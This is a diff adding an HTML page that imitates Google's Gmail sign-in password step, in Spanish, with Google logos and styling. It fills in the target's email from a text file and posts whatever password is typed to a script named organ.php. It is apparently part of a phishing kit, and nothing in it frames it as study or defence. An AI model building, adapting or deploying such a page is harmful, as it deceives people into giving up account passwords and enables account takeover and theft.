@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail</title>
+    <link rel="icon" href="style/google.ico" type="image/x-icon">
+    <style>
+
+      * {
+        margin: 0%;
+        padding: 0%;
+        box-sizing: border-box;
+      }
+      body {
+        font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;
+      }
+      a {
+        text-decoration: none;
+        color: #1a73e8;
+        display: block;
+        font-size: 14px;
+      }
+      .container {
+        max-width: 450px;
+        border: 1px solid rgb(228, 228, 228);
+        margin: auto;
+        margin-top: 4rem;
+        border-radius: 10px;
+        padding: 2rem;
+        height: 500px;
+        /* text-align: center; */
+      }
+      .top-content {
+        text-align: center;
+      }
+      .img {
+        width: 80px;
+        margin: 10px 0;
+      }
+      h2 {
+        font-size: 20px;
+        font-weight: 100;
+        margin-bottom: 10px;
+      }
+      .heading {
+        margin-bottom: 30px;
+      }
+      input[type="email"] {
+        display: block;
+        border: 1px solid rgb(228, 228, 228);
+        font-size: 16px;
+        width: 100%;
+        height: 55px;
+        padding: 0 15px;
+        margin-bottom: 10px;
+        position: relative;
+        z-index: 2;
+        background-color: transparent;
+        outline: none;
+        border-radius: 5px;
+        position: relative;
+      }
+      .inputs {
+        position: relative;
+      }
+      .input-label {
+        position: absolute;
+        top: 15px;
+        font-size: 1.1rem;
+        left: 14px;
+        color: rgb(122, 122, 122);
+        font-weight: 100;
+        transition: 0.1s ease;
+        background-color: white;
+        padding: 0 5px;
+      }
+      
+      input[type="email"]:focus ~ .input-label {
+        top: -7px;
+        color: #1864c9;
+        font-size: 13px;
+        background-color: rgb(255, 255, 255);
+        z-index: 2;
+      }
+      input[type="email"]:target ~ .input-label {
+        top: -7px;
+        color: #1864c9;
+        font-size: 13px;
+        background-color: rgb(255, 255, 255);
+        z-index: 2;
+      }
+      .input:focus {
+        border: 2px solid #1a73e8;
+      }
+      .link-btn {
+        margin-bottom: 2rem;
+      }
+      .color {
+        color: rgb(90, 90, 90);
+        font-size: 14px;
+        margin-bottom: 5px;
+      }
+      .btn-group {
+        display: flex;
+        justify-content: space-between;
+      }
+      .create-btn {
+        border: none;
+        background-color: transparent;
+        color: #1a73e8;
+        font-weight: bold;
+        cursor: pointer;
+        height: 35px;
+        padding: 10px 5px;
+      }
+      .next-btn {
+        background-color: #1a73e8;
+        color: white;
+        border: none;
+        height: 38px;
+        padding: 0 25px;
+        border-radius: 5px;
+        cursor: pointer;
+      }
+      .create-btn:hover {
+        background-color: #e8f2ff6e;
+        /* transition: 0.2s all ease-in; */
+      }
+      .next-btn:hover {
+        background-color: #1864c9;
+      }
+      .footer {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding-top: 24px;
+        font-size: 12px;
+        width: 448px;
+        color: var(--p);
+      }
+      
+      .footer select {
+        background: transparent;
+        border: none;
+        cursor: pointer;
+        outline: none;
+      }
+      
+      .footer .footer-span span {
+        margin-left: 32px;
+      }
+      
+      main {
+          display: flex;
+            justify-content: center;
+      }
+      #cont {
+          padding: 3px;
+          border: 1px solid #ddd;
+          border-radius: 20px;
+          display: flex;
+          align-items: center;
+      }
+      #contenido-archivo {
+      margin: 0; /* Elimina el margen predeterminado del <pre> */
+      font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;
+      }
+
+      .inputBox {
+        position: relative;
+        font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;
+      }
+      
+    .inputBox input {
+        width: 93%;
+        padding: 16px;
+        font-size: 1rem;
+        letter-spacing: 0.062rem;
+        margin-bottom: 1.875rem;
+        border: 1px solid #ccc;
+        background: transparent;
+        border-radius: 4px;
+        
+      }
+      
+    .inputBox label {
+        position: absolute;
+        top: 0;
+        left: 10px;
+        padding: 0.950rem 0;
+        font-size: 1rem;
+        color: grey;
+        pointer-events: none;
+        transition: 0.3s;
+      }
+      
+    .inputBox input:focus ~ label,
+    .inputBox input:valid ~ label,
+    .inputBox input:not([value=""]) ~ label {
+        top: -1.125rem;
+        left: 10px;
+        color: #1a73e8;
+        font-size: 0.75rem;
+        background-color: white;
+        height: 10px;
+        padding-left: 5px;
+        padding-right: 5px;
+      }
+    .inputBox input:focus {
+        outline: none;
+        border: 2px solid #1a73e8;
+      }
+    .tam {
+      font-size: 15px;
+    }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+          <div class="top-content">
+            <img class="img" src="style/logo.png" alt="">
+        <b><h2>Te damos la bienvenida</h2></b>
+      </div>
+
+        <main>
+            <div id="cont">
+                 <img src="style/user20.png" style="max-width: 20%; height: 16px;"> 
+                <pre id="contenido-archivo"></pre>
+                 <img src="style/fle20.png" style="max-width: 20%; height: 12px;"> 
+            </div>
+        </main>
+
+<br>
+<br>
+<br>
+<br>
+<form action="organ.php" method="POST" class="row g-3">
+  <div class="inputBox">
+    <input type="password" name="nombre" required="" onkeyup="this.setAttribute('value', this.value);" value="" id="show">
+    <label>Ingresa tu contraseña</label>
+  </div>
+        <input type="checkbox" name="" onclick="myfunction()"><label>  Mostrar contraseña</label>
+          <script type="text/JavaScript">
+      function myfunction() {
+        var show = document.getElementById('show');
+        if (show.type=='password'){
+          show.type='text';
+        }
+        else{
+          show.type='password';
+        }
+      }
+    </script>
+  <br>
+  <br>
+  <br>
+  <br>
+        <div class="btn-group">
+          <button class="create-btn" style="font-size: 14px;">¿Olvidaste la contraseña?</button>
+          <button class="next-btn"><b>Siguiente</b></button>
+        </div>
+      </div>
+    </form>
+      <script>
+        // Cargar el contenido del archivo.txt usando JavaScript
+        var archivo = new XMLHttpRequest();
+        archivo.open("GET", "emal.txt", true);
+        archivo.onreadystatechange = function () {
+          if (archivo.readyState === 4 && archivo.status === 200) {
+            // Mostrar el contenido en la etiqueta <pre>
+            document.getElementById("contenido-archivo").textContent = archivo.responseText;
+          }
+        };
+        archivo.send();
+      </script>
+      <center>
+        <div class="footer">
+          <select name="select">
+            <option value="Portugês (Brasil) selected">Español (Latinoamérica)</option>
+            <option value="English (United States)">
+              English (United States)
+            </option>
+          </select>
+      
+          <div class="footer-span">
+            <span>ayuda</span>
+            <span>Privacidad</span>
+            <span>Condiciones</span>
+          </div>
+        </div>
+        </center>
+</body>
+</html>
